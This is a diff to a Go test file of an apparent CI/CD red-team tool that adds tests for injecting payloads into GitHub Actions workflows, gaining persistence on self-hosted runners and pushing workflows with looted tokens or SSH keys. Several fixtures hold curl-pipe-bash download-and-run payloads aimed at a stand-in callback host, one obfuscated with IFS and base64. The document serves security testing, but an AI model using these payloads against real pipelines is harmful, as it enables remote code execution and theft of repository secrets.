@@ -14,6 +14,7 @@ import (
 
 	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
 	"github.com/boostsecurityio/smokedmeat/internal/counter"
+	"github.com/boostsecurityio/smokedmeat/internal/pantry"
 )
 
 func newModelForWizardDeploy(t *testing.T, mock *mockKitchenClient) Model {
@@ -26,6 +27,26 @@ func newModelForWizardDeploy(t *testing.T, mock *mockKitchenClient) Model {
 	m.kitchenClient = mock
 	m.phase = PhaseWizard
 	return m
+}
+
+func observedSelfHostedRunnerPantry(t *testing.T) *pantry.Pantry {
+	t.Helper()
+
+	p := pantry.New()
+	repo := pantry.NewRepository("acme", "api", "github")
+	workflow := pantry.NewWorkflow(repo.ID, ".github/workflows/pr.yml")
+	job := pantry.NewJob(workflow.ID, "build")
+	job.SetProperty("self_hosted", true)
+	job.SetProperty("runs_on", []string{"self-hosted", "linux", "x64"})
+
+	require.NoError(t, p.AddAsset(repo))
+	require.NoError(t, p.AddAsset(workflow))
+	require.NoError(t, p.AddAsset(job))
+	require.NoError(t, p.AddRelationship(repo.ID, workflow.ID, pantry.Contains()))
+	require.NoError(t, p.AddRelationship(workflow.ID, job.ID, pantry.Contains()))
+	assert.Equal(t, 1, pantry.SyncObservedSelfHostedRunnerTargets(p))
+
+	return p
 }
 
 func TestExecuteWizardDeployment_NilWizard(t *testing.T) {
@@ -133,6 +154,287 @@ func TestExecuteWizardDeployment_Comment_PrefersBashContext(t *testing.T) {
 	cmd()
 	assert.Contains(t, mock.lastDeployCommentReq.Payload, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/")
 	assert.NotContains(t, mock.lastDeployCommentReq.Payload, "#'; curl -s https://callback.smokedmeat.local/r/smokedmeat/")
+}
+
+func TestVulnerabilityCanAttemptPersistence_SelfHostedBashNoGate(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.pantry = observedSelfHostedRunnerPantry(t)
+
+	vuln := &Vulnerability{
+		Repository:  "acme/api",
+		Workflow:    ".github/workflows/pr.yml",
+		Job:         "build",
+		Context:     "issue_body",
+		BashContext: "bash_unquoted",
+	}
+
+	assert.True(t, m.vulnerabilityCanAttemptPersistence(vuln))
+}
+
+func TestVulnerabilityCanAttemptPersistence_RejectsGateTriggers(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.pantry = observedSelfHostedRunnerPantry(t)
+
+	vuln := &Vulnerability{
+		Repository:   "acme/api",
+		Workflow:     ".github/workflows/pr.yml",
+		Job:          "build",
+		Context:      "issue_body",
+		BashContext:  "bash_unquoted",
+		GateTriggers: []string{"/deploy"},
+	}
+
+	assert.False(t, m.vulnerabilityCanAttemptPersistence(vuln))
+}
+
+func TestToggleWizardPersistenceAttempt_ClearsManualPayloadPreview(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.pantry = observedSelfHostedRunnerPantry(t)
+	m.wizard = &WizardState{}
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindVulnerability
+	m.wizard.DeliveryMethod = DeliveryManualSteps
+	m.wizard.SelectedVuln = &Vulnerability{
+		Repository:  "acme/api",
+		Workflow:    ".github/workflows/pr.yml",
+		Job:         "build",
+		Context:     "issue_body",
+		BashContext: "bash_unquoted",
+	}
+	m.wizard.Payload = "stale-preview"
+
+	m.toggleWizardPersistenceAttempt()
+
+	assert.True(t, m.wizard.PersistenceAttempt)
+	assert.Empty(t, m.wizard.Payload)
+}
+
+func TestBuildRunnerTargetCallbackScript_UsesStandaloneShell(t *testing.T) {
+	script := buildRunnerTargetCallbackScript("https://callback.smokedmeat.local/r/smokedmeat/stg1", false)
+
+	assert.Contains(t, script, `curl -fsSL "https://callback.smokedmeat.local/r/smokedmeat/stg1" | bash`)
+	assert.NotContains(t, script, "$(")
+	assert.NotContains(t, script, persistenceEnvKey)
+}
+
+func TestBuildRunnerTargetCallbackScript_PersistentSetsPersistEnvOnBash(t *testing.T) {
+	script := buildRunnerTargetCallbackScript("https://callback.smokedmeat.local/r/smokedmeat/stg1", true)
+
+	assert.Contains(t, script, `curl -fsSL "https://callback.smokedmeat.local/r/smokedmeat/stg1" | `+persistenceEnvKey+`=1 bash`)
+	assert.NotContains(t, script, "$(")
+}
+
+func TestDecoratePayloadForPersistence_UsesBashEnvAssignment(t *testing.T) {
+	payload := "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/stg1|bash)"
+
+	decorated := decoratePayloadForPersistence(payload)
+
+	assert.Equal(t, "$(curl -s https://callback.smokedmeat.local/r/smokedmeat/stg1|"+persistenceEnvKey+"=1 bash)", decorated)
+}
+
+func TestDecoratePayloadForPersistence_PreservesIFSSpacing(t *testing.T) {
+	payload := "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0cHM6Ly9jYWxsYmFjay5zbW9rZWRtZWF0LmxvY2FsL3Ivc21va2VkbWVhdC9zdGcx')|bash)"
+
+	decorated := decoratePayloadForPersistence(payload)
+
+	assert.Equal(t, "$(curl${IFS}-s${IFS}$(base64${IFS}-d<<<'aHR0cHM6Ly9jYWxsYmFjay5zbW9rZWRtZWF0LmxvY2FsL3Ivc21va2VkbWVhdC9zdGcx')|"+persistenceEnvKey+"=1${IFS}bash)", decorated)
+}
+
+func TestExecuteRunnerTargetWizardAction_PersistentCallbackStartsWaiting(t *testing.T) {
+	mock := &mockKitchenClient{
+		registerCallbackResp: &counter.RegisterCallbackResponse{
+			Callback: &counter.CallbackPayload{
+				ID:         "cb-runner-1",
+				Persistent: true,
+				Metadata: map[string]string{
+					"callback_label": "Self-hosted runner - .github/workflows/smokedmeat-self-hosted.yml",
+					"workflow":       runnerTargetWorkflowPath(),
+					"job":            runnerTargetWorkflowJobName(),
+				},
+			},
+		},
+	}
+	m := newModelForWizardDeploy(t, mock)
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindRunnerTarget
+	m.wizard.Step = 3
+	m.wizard.RunnerTargetAction = RunnerTargetActionCopyWorkflow
+	m.wizard.PersistenceAttempt = true
+	m.wizard.DwellTime = 2 * time.Minute
+	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
+		Repository:            "acme/api",
+		LabelDisplay:          "linux-x64 +dynamic",
+		LabelSet:              []string{"self-hosted", "linux", "x64"},
+		DynamicLabelSet:       []string{"${{ needs.bootstrap.outputs.runner_label }}"},
+		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
+		ObservedJobNames:      []string{"build"},
+	}
+
+	result, cmd := m.executeRunnerTargetWizardAction()
+
+	model := result.(Model)
+	assert.Nil(t, cmd)
+	assert.Equal(t, PhaseWaiting, model.phase)
+	require.NotNil(t, model.waiting)
+	assert.Equal(t, mock.lastRegisterCallbackID, model.waiting.StagerID)
+	assert.Equal(t, "acme/api", model.waiting.TargetRepo)
+	assert.Equal(t, runnerTargetWorkflowPath(), model.waiting.TargetWorkflow)
+	assert.Equal(t, runnerTargetWorkflowJobName(), model.waiting.TargetJob)
+	assert.Equal(t, 2*time.Minute, model.waiting.DwellTime)
+	require.Len(t, model.callbacks, 1)
+	assert.Equal(t, "Self-hosted runner - .github/workflows/smokedmeat-self-hosted.yml", model.callbacks[0].Metadata["callback_label"])
+	assert.Equal(t, runnerTargetWorkflowPath(), model.callbacks[0].Metadata["workflow"])
+	assert.Equal(t, runnerTargetWorkflowJobName(), model.callbacks[0].Metadata["job"])
+	assert.True(t, mock.lastRegisterCallbackReq.Persistent)
+	assert.Equal(t, "self_hosted_runner", mock.lastRegisterCallbackReq.Metadata["callback_kind"])
+	assert.Equal(t, "resident", mock.lastRegisterCallbackReq.Metadata["persistence_mode"])
+}
+
+func TestAdvanceRunnerTargetWizardStep_WeakAutoWorkflowPushStillShowsStep3(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.phase = PhaseWizard
+	m.tokenInfo = &TokenInfo{Value: "ghs_app_token", Type: TokenTypeInstallApp, Source: "loot:APP_TOKEN_whooli"}
+	m.appTokenPermissions = map[string]string{
+		"contents": "read",
+	}
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindRunnerTarget
+	m.wizard.Step = 2
+	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
+	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
+		Repository:   "whooli/infrastructure-definitions",
+		LabelDisplay: "linux-x64",
+		LabelSet:     []string{"self-hosted", "linux", "x64"},
+	}
+
+	result, cmd := m.advanceRunnerTargetWizardStep()
+
+	model := result.(Model)
+	assert.Nil(t, cmd)
+	assert.Equal(t, 3, model.wizard.Step)
+}
+
+func TestHandleRunnerTargetWizardKeyMsg_PersistentAutoWorkflowPushIgnoresDwellAndBudgetKeys(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.phase = PhaseWizard
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindRunnerTarget
+	m.wizard.Step = 3
+	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
+	m.wizard.PersistenceAttempt = true
+	m.wizard.DwellTime = 2 * time.Minute
+	m.wizard.CallbackBudget = 3
+
+	result, cmd := m.handleRunnerTargetWizardKeyMsg(tea.KeyPressMsg{Text: "d", Code: 'd'})
+	model := result.(Model)
+	assert.Nil(t, cmd)
+	assert.Equal(t, 2*time.Minute, model.wizard.DwellTime)
+	assert.Equal(t, 3, model.wizard.CallbackBudget)
+
+	result, cmd = model.handleRunnerTargetWizardKeyMsg(tea.KeyPressMsg{Text: "b", Code: 'b'})
+	model = result.(Model)
+	assert.Nil(t, cmd)
+	assert.Equal(t, 2*time.Minute, model.wizard.DwellTime)
+	assert.Equal(t, 3, model.wizard.CallbackBudget)
+}
+
+func TestExecuteRunnerTargetWizardAction_AutoWorkflowPushUsesKitchenDeploy(t *testing.T) {
+	mock := &mockKitchenClient{
+		deploySelfHostedWorkflowPushResp: counter.DeploySelfHostedWorkflowPushResponse{
+			Branch:    "smokedmeat-runner-123",
+			BranchURL: "https://github.com/acme/api/tree/smokedmeat-runner-123",
+		},
+	}
+	m := newModelForWizardDeploy(t, mock)
+	m.tokenInfo = &TokenInfo{
+		Value:  "ghs_app_token",
+		Type:   TokenTypeInstallApp,
+		Source: "loot:APP_TOKEN_acme",
+		Owner:  "acme",
+	}
+	m.appTokenPermissions = map[string]string{
+		"contents":  "write",
+		"workflows": "write",
+	}
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindRunnerTarget
+	m.wizard.Step = 3
+	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
+	m.wizard.DwellTime = 2 * time.Minute
+	m.wizard.Preflight = &counter.DeployPreflightResponse{
+		Capabilities: map[string]counter.DeployPreflightCapability{
+			deployCapabilityWorkflowPush: {State: deployStatePass},
+		},
+	}
+	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
+		Repository:            "acme/api",
+		LabelDisplay:          "linux-x64",
+		LabelSet:              []string{"self-hosted", "linux", "x64"},
+		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
+		ObservedJobNames:      []string{"build"},
+	}
+
+	result, cmd := m.executeRunnerTargetWizardAction()
+
+	model := result.(Model)
+	require.NotNil(t, cmd)
+	assert.Equal(t, PhaseRecon, model.phase)
+	assert.Nil(t, model.wizard.Preflight)
+	msg := cmd()
+	success, ok := msg.(RunnerTargetWorkflowPushSuccessMsg)
+	require.True(t, ok)
+	assert.Equal(t, "https://github.com/acme/api/tree/smokedmeat-runner-123", success.BranchURL)
+	assert.Equal(t, "acme/api", mock.lastDeploySelfHostedWorkflowReq.RepoName)
+	assert.NotEmpty(t, mock.lastDeploySelfHostedWorkflowReq.Branch)
+	assert.Equal(t, runnerTargetWorkflowPath(), mock.lastDeploySelfHostedWorkflowReq.Path)
+	assert.Contains(t, mock.lastDeploySelfHostedWorkflowReq.Content, "runs-on:")
+	assert.Contains(t, mock.lastDeploySelfHostedWorkflowReq.Content, "  push:")
+}
+
+func TestExecuteRunnerTargetWizardAction_AutoWorkflowPushUsesSSHWhenAvailable(t *testing.T) {
+	mock := &mockKitchenClient{}
+	m := newModelForWizardDeploy(t, mock)
+	m.wizard.Reset()
+	m.wizard.Kind = WizardKindRunnerTarget
+	m.wizard.Step = 3
+	m.wizard.RunnerTargetAction = RunnerTargetActionAutoWorkflowPush
+	m.wizard.DwellTime = 90 * time.Second
+	m.wizard.SelectedRunnerTarget = &RunnerTargetSelection{
+		Repository:            "acme/api",
+		LabelDisplay:          "linux-x64",
+		LabelSet:              []string{"self-hosted", "linux", "x64"},
+		ObservedWorkflowPaths: []string{".github/workflows/pr.yml"},
+		ObservedJobNames:      []string{"build"},
+	}
+	m.sshState = &SSHState{
+		KeyName:  "DEPLOY_KEY",
+		KeyValue: "-----BEGIN OPENSSH PRIVATE KEY-----\nkey\n-----END OPENSSH PRIVATE KEY-----",
+		Results: []SSHTrialResult{
+			{Repo: "acme/api", Success: true, Permission: "write"},
+		},
+	}
+
+	original := pushRunnerTargetWorkflowViaSSHFn
+	t.Cleanup(func() { pushRunnerTargetWorkflowViaSSHFn = original })
+	pushRunnerTargetWorkflowViaSSHFn = func(_ *SSHState, repo, branchName, workflowPath, workflowYAML, _ string) (string, string, error) {
+		assert.Equal(t, "acme/api", repo)
+		assert.NotEmpty(t, branchName)
+		assert.Equal(t, runnerTargetWorkflowPath(), workflowPath)
+		assert.Contains(t, workflowYAML, "  push:")
+		return "smokedmeat-runner-ssh", "https://github.com/acme/api/tree/smokedmeat-runner-ssh", nil
+	}
+
+	result, cmd := m.executeRunnerTargetWizardAction()
+
+	model := result.(Model)
+	require.NotNil(t, cmd)
+	assert.Equal(t, PhaseRecon, model.phase)
+	msg := cmd()
+	success, ok := msg.(RunnerTargetWorkflowPushSuccessMsg)
+	require.True(t, ok)
+	assert.Equal(t, "ssh", success.Route)
+	assert.Equal(t, "https://github.com/acme/api/tree/smokedmeat-runner-ssh", success.BranchURL)
+	assert.Empty(t, mock.lastDeploySelfHostedWorkflowReq.RepoName)
 }
 
 func TestExecuteWizardDeployment_Comment_InvalidIssueNum(t *testing.T) {
